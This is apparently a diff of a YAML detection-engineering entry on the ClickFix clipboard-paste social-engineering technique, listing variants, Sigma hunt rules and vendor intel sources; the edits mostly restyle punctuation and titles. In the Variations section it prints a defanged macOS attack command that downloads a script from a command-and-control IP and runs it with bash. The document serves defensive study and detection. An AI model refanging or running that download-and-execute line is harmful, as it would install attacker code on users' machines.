@@ -13,8 +13,7 @@ Description: 'User pastes a malicious command from their clipboard into a Run di
   address bar. The lure page writes to the clipboard via JavaScript and the user does the rest. No attachment,
   no exploit, no macro. The clipboard is the delivery mechanism and the scripting interpreter spawn is the
   chokepoint. 9 variants tracked, from fake CAPTCHAs to cloned install pages to DNS-based payload retrieval.
-  APT28, MuddyWater, and Kimsuky adopted ClickFix for espionage in late 2024. This is not just commodity
-  crimeware anymore.
+  APT28, MuddyWater, and Kimsuky adopted ClickFix for espionage in late 2024.
 
   '
 LastUpdated: '2026-03-10'
@@ -100,7 +99,7 @@ Variations:
       Same C2 IP as the macOS payload. Single infrastructure, dual OS targeting. Sourced from Huntress ClickFix analysis.'
   - Platform: macOS
     Command: 'curl -o troubleshot.sh hxxp[://]93.185.166[.]113/troubleshot.sh && chmod +x troubleshot.sh && bash troubleshot.sh'
-    Note: 'Served via atob() decoding when navigator.platform matches macOS. Downloads troubleshot.sh (note typo in filename —
+    Note: 'Served via atob() decoding when navigator.platform matches macOS. Downloads troubleshot.sh (note typo in filename:
       "troubleshot" not "troubleshoot"), sets executable permission, and runs via bash. Three-step chain instead of piped
       execution. The file touches disk before running, unlike the Windows variant. Same C2 IP. Sourced from Huntress
       ClickFix analysis.'
@@ -142,8 +141,7 @@ Variations:
   NotesShort: Family of variants using clipboard-paste-execute with different social engineering pretexts
   Notes: 'Expanding family of named variants using the same clipboard-paste-execute primitive with different social engineering
     pretexts (consent dialogs, glitch/error UIs); same chokepoint applies. The GlitchFix / ErrTraffic panel renders
-    garbled page content alongside a fake browser update dialog ("Browser update recommended") to create urgency —
-    the victim believes their browser is broken and installs a malicious update.'
+    garbled page content alongside a fake browser update dialog ("Browser update recommended") to create urgency. The victim believes their browser is broken and installs a malicious update.'
   VariantId: jackfix-glitchfix-consentfix
   LurePreview: /assets/lures/glitchfix.html
   Lure: 'Expanding family using different social engineering pretexts: ConsentFix uses fake OAuth/consent dialogs ("Allow
@@ -431,8 +429,8 @@ Detections:
   UseCase: Environmental baseline
   SigmaRule: sigma-rules/clickfix/research.yml
 - Level: Hunt
-  Description: 'Browser/explorer/wt.exe spawning script interpreter. Process creation only —
-    correlate ProcessGuid with hunt-network.yml for Stage 3.'
+  Description: 'Browser/explorer/wt.exe spawning script interpreter. Process creation only.
+    Correlate ProcessGuid with hunt-network.yml for Stage 3.'
   LogSources:
   - Sysmon Event ID 1 (Process Creation)
   - Windows Security Event ID 4688 (Process Creation)
@@ -488,7 +486,7 @@ EarlyDetections:
   UseCase: Proactive infrastructure blocking; phishing triage; threat intel enrichment
   IokRule: iok-rules/clickfix/clickfix-lure.yml
 Intel:
-- Name: Proofpoint — ClickFix Social Engineering Technique Floods Threat Landscape
+- Name: 'Proofpoint: ClickFix Social Engineering Technique Floods Threat Landscape'
   Tier: primary
   URL: https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape
   Description: Original Proofpoint research naming and first documenting ClickFix; covers TA571 initial campaigns and early
@@ -496,21 +494,21 @@ Intel:
   LinkedFrom:
   - ClickFix
   - EvolutionTimeline
-- Name: 'Proofpoint — Around the World in 90 Days: State-Sponsored Actors Try ClickFix'
+- Name: 'Proofpoint: Around the World in 90 Days: State-Sponsored Actors Try ClickFix'
   Tier: primary
   URL: https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix
   Description: Documents APT28, MuddyWater (TA450), Kimsuky (TA427), and UNK_RemoteRogue adoption of ClickFix between October
     2024 and February 2025
   LinkedFrom:
   - Nation-state adoption begins
-- Name: Microsoft Security Blog — Think Before You ClickFix
+- Name: 'Microsoft Security Blog: Think Before You ClickFix'
   Tier: primary
   URL: https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/
   Description: Comprehensive Microsoft Threat Intelligence analysis covering technique mechanics, nation-state adoption, and
     the commercialization of ClickFix builders on hacker forums
   LinkedFrom:
   - EvolutionTimeline
-- Name: Huntress — Don't Sweat the ClickFix Techniques
+- Name: 'Huntress: Don''t Sweat the ClickFix Techniques'
   Tier: primary
   URL: https://huntress.com/blog/dont-sweat-clickfix-techniques
   Description: Primary reference for the ClickFix variant taxonomy (FileFix, TerminalFix, DownloadFix); explains why the chokepoint
@@ -519,7 +517,7 @@ Intel:
   - FileFix
   - TerminalFix
   - DownloadFix
-- Name: 'MITRE ATT&CK — T1204.004 User Execution: Malicious Copy and Paste'
+- Name: 'MITRE ATT&CK: T1204.004 User Execution: Malicious Copy and Paste'
   Tier: primary
   URL: https://attack.mitre.org/techniques/T1204/004/
   Description: Official technique definition created March 2025, published in ATT&CK v17 April 2025; procedure examples and
@@ -531,21 +529,21 @@ Intel:
     hunting queries to identify indicators in your environment. See intel/clickgrab.md for usage guidance.
 
     '
-- Name: Matt Graeber — Microsoft.Windows.OLE.Clipboard ETW Provider
+- Name: 'Matt Graeber: Microsoft.Windows.OLE.Clipboard ETW Provider'
   Tier: primary
   URL: https://gist.github.com/mattifestation/04e8299d8bc97ef825affe733310f7bd
   Description: 'Discovery and documentation of the OLE Clipboard ETW provider (GUID: 3e0e3a92-b00b-4456-9dee-f40aba77f00e);
     foundational reference for clipboard write ETW monitoring and ClickFix pre-execution detection'
   LinkedFrom:
   - Clipboard Seeding
-- Name: Mandiant — SilkETW
+- Name: 'Mandiant: SilkETW'
   Tier: primary
   URL: https://github.com/mandiant/SilkETW
   Description: C# ETW wrapper for security telemetry; enables Microsoft-Windows-Win32k and OLE Clipboard provider monitoring
     with JSON output and Windows Event Log forwarding; required infrastructure for the ETW clipboard detection layer
   LinkedFrom:
   - Clipboard Seeding
-- Name: phish.report — IOK Rule Reference
+- Name: 'phish.report: IOK Rule Reference'
   Tier: primary
   URL: https://phish.report/docs/iok-rule-reference
   Description: IOK (Indicator of Kit) rule format documentation; Sigma-based syntax for detecting phishing and lure page infrastructure;
